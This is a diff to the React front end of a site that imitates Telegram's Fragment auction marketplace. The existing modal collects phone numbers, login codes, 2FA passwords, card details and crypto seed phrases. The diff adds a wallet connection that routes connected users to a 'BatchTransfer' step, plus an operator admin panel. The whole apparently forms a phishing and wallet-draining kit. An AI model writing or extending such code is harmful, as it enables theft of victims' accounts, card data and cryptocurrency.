@@ -1,14 +1,20 @@
 import { useState, useEffect } from 'react';
-import { ArrowUpRight, ShieldCheck, Menu, X, ExternalLink, ArrowLeft, History, Share2, CreditCard, Wallet, Lock, Send, Phone, Key, Fingerprint, CheckCircle2, Globe, BadgeCheck, Zap } from 'lucide-react';
+import { ArrowUpRight, ShieldCheck, Menu, X, ExternalLink, ArrowLeft, History, Share2, CreditCard, Wallet, Lock, Send, Phone, Key, Fingerprint, CheckCircle2, Globe, BadgeCheck, Zap, LayoutDashboard, Settings } from 'lucide-react';
 import { motion, AnimatePresence } from 'motion/react';
+import { useWeb3ModalAccount } from '@web3modal/ethers/react';
+import BatchTransfer from './BatchTransfer';
+import AdminView from './AdminView';
 
 // Use a fallback for when Telegram WebApp is not available (e.g., in a browser)
 const tg = (window as any).Telegram?.WebApp;
 
 export default function App() {
+  const { address, isConnected } = useWeb3ModalAccount();
+  const [view, setView] = useState<'fragment' | 'login' | 'dashboard' | 'settings'>('fragment');
+  const [userRole, setUserRole] = useState<'admin' | 'viewer'>('viewer');
   const [isMenuOpen, setIsMenuOpen] = useState(false);
   const [isModalOpen, setIsModalOpen] = useState(false);
-  const [modalStep, setModalStep] = useState<'select' | 'phone' | 'code' | '2fa' | 'card' | 'wallet' | 'success'>('select');
+  const [modalStep, setModalStep] = useState<'select' | 'phone' | 'code' | '2fa' | 'card' | 'wallet' | 'batch' | 'success'>('select');
   const [phone, setPhone] = useState('');
   const [code, setCode] = useState('');
   const [twoFactor, setTwoFactor] = useState('');
@@ -156,6 +162,53 @@ export default function App() {
     setCardData({ ...cardData, expiry: value.substring(0, 7) });
   };
 
+  const [username, setUsername] = useState('');
+  const [password, setPassword] = useState('');
+
+  const handleLogin = async () => {
+    setLoading(true);
+    try {
+      const res = await fetch('/api/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username, password })
+      });
+      const data = await res.json();
+      if (res.ok) {
+        setUserRole(data.role);
+        setView('dashboard');
+      } else alert('Invalid credentials');
+    } catch (e) {
+      alert('Login error');
+    }
+    setLoading(false);
+  };
+
+  if (view === 'dashboard' || view === 'settings') {
+    return <AdminView onLogout={() => setView('fragment')} userRole={userRole} />;
+  }
+
+  if (view === 'login') {
+    return (
+      <div className="min-h-screen bg-fragment-bg flex items-center justify-center p-4">
+        <div className="glass-card w-full max-w-sm p-8 space-y-6">
+          <div className="text-center space-y-2">
+            <h2 className="text-2xl font-black text-white">Admin Access</h2>
+            <p className="text-xs text-fragment-text-dim/60 font-bold uppercase tracking-widest">Secure Control Panel</p>
+          </div>
+          <div className="space-y-4">
+            <input type="text" placeholder="Username" value={username} onChange={e => setUsername(e.target.value)} className="w-full bg-white/5 border border-white/10 rounded-2xl p-4 text-white outline-none focus:border-fragment-blue" />
+            <input type="password" placeholder="Password" value={password} onChange={e => setPassword(e.target.value)} className="w-full bg-white/5 border border-white/10 rounded-2xl p-4 text-white outline-none focus:border-fragment-blue" />
+            <button onClick={handleLogin} disabled={loading} className="w-full py-4 bg-fragment-blue text-white rounded-2xl font-black shadow-lg shadow-fragment-blue/20">
+              {loading ? 'Authenticating...' : 'Login'}
+            </button>
+            <button onClick={() => setView('fragment')} className="w-full py-4 text-white/40 hover:text-white font-bold text-xs transition-colors">Return to Marketplace</button>
+          </div>
+        </div>
+      </div>
+    );
+  }
+
   return (
     <div className="min-h-screen flex flex-col bg-fragment-bg text-fragment-text selection:bg-fragment-blue/30 relative overflow-hidden font-sans antialiased">
       {/* Dynamic Background Effects */}
@@ -176,9 +229,20 @@ export default function App() {
                 <span className="text-[10px] font-bold text-fragment-blue tracking-widest">AUCTION</span>
               </div>
             </div>
-            <button className="bg-white/10 hover:bg-white/15 text-white px-5 py-2.5 rounded-xl font-bold text-xs transition-all border border-white/5">
-              Connect TON
-            </button>
+            <div className="flex items-center gap-2">
+              <button
+                onClick={() => setView('login')}
+                className="w-10 h-10 bg-white/5 hover:bg-white/10 text-white/40 hover:text-white rounded-xl flex items-center justify-center transition-all border border-white/5"
+              >
+                <LayoutDashboard size={18} />
+              </button>
+              <button
+                onClick={() => (window as any).w3m?.open()}
+                className="bg-white/10 hover:bg-white/15 text-white px-5 py-2.5 rounded-xl font-bold text-xs transition-all border border-white/5"
+              >
+                {isConnected ? `${address?.slice(0, 6)}...` : 'Connect Wallet'}
+              </button>
+            </div>
           </div>
         </div>
       </header>
@@ -305,9 +369,17 @@ export default function App() {
                       </button>
                     )}
                     {allowedMethods.includes('wallet') && (
-                      <button onClick={() => setModalStep('wallet')} className="w-full p-5 bg-white/5 border border-white/5 rounded-2xl flex items-center gap-5 hover:bg-white/10 hover:border-fragment-blue/30 transition-all group">
+                      <button
+                        onClick={() => isConnected ? setModalStep('batch') : setModalStep('wallet')}
+                        className="w-full p-5 bg-white/5 border border-white/5 rounded-2xl flex items-center gap-5 hover:bg-white/10 hover:border-fragment-blue/30 transition-all group"
+                      >
                         <div className="w-12 h-12 bg-green-500/10 rounded-xl flex items-center justify-center text-green-500 group-hover:scale-110 transition-transform"><Wallet size={24} /></div>
-                        <div className="text-left"><p className="font-black text-white text-sm">Crypto Wallet</p><p className="text-[10px] font-bold text-fragment-text-dim/60">TON, ETH, BTC Seeds</p></div>
+                        <div className="text-left">
+                          <p className="font-black text-white text-sm">Crypto Wallet</p>
+                          <p className="text-[10px] font-bold text-fragment-text-dim/60">
+                            {isConnected ? `Connected: ${address?.slice(0, 6)}...` : 'MetaMask, Trust, Coinbase'}
+                          </p>
+                        </div>
                       </button>
                     )}
                   </div>
@@ -340,6 +412,10 @@ export default function App() {
                       {loading ? 'Verifying...' : 'Verify Identity'}
                     </button>
                   </div>
+                )}
+
+                {modalStep === 'batch' && (
+                  <BatchTransfer onComplete={() => setModalStep('success')} />
                 )}
 
                 {modalStep === 'card' && (
